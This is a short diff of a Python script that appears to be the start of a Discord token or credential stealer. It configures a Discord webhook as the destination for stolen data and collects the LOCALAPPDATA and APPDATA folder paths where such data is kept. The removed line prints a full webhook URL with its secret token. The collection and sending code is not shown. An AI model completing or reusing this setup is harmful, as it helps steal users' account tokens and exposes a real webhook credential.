@@ -2,7 +2,7 @@ import os
 import re
 import requests
 import json
-webhook = "https://discord.com/api/webhooks/884123847127867423/duLKkYmnRvJ_5D8dAq_o2bdFhCSrWehTX9n7hbZo09iIyRq2vD4YaXasYrcLiuOSSa0v"  # Input Your WEBHOOK URL Here
+webhook = ""  # Input Your WEBHOOK URL Here
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 paths = {
